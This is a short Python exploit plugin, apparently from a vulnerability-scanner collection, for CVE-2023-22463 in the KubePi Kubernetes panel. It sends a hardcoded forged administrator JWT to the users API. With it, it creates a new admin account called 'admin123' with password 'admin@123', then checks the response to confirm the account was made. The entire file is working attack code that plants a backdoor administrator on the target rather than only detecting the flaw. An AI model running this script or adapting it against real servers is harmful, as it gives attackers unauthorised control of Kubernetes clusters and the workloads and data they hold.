#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/HIKouE6zGJQLm47xoBG6JQ',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'kubepi CVE-2023-22463',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJuaWNrTmFtZSI6IkFkbWluaXN0cmF0b3IiLCJlbWFpbCI6InN1cHBvcnRAZml0MmNsb3VkLmNvbSIsImxhbmd1YWdlIjoiemgtQ04iLCJyZXNvdXJjZVBlcm1pc3Npb25zIjp7fSwiaXNBZG1pbmlzdHJhdG9yIjp0cnVlLCJtZmEiOnsiZW5hYmxlIjpmYWxzZSwic2VjcmV0IjoiIiwiYXBwcm92ZWQiOmZhbHNlfSwiaWF0IjoxNjcyNjUxNzc2LCJleHAiOjE3ODM2NTIzNzZ9.i-83qNf6pGJkUYdZCknHeTG6PsYKc1FRyjrRcPJUKvI',
      'accept': 'application/json',
      }
  target = '/kubepi/api/v1/users'
  data='''
{
   "authenticate": {
     "password": "admin@123"
   },
   "email": "admin@123.com",
   "isAdmin": true,
   "mfa": {
     "enable": false
   },
   "name": "admin123",
   "nickName": "admin123",
   "roles": [
     "admin"
   ]
 }

  '''
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'apiVersion.*?createdBy.*?name.*?uuid.*?email.*?password.*?',res.text,re.S):
      # ret['huixian'] = res.text
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret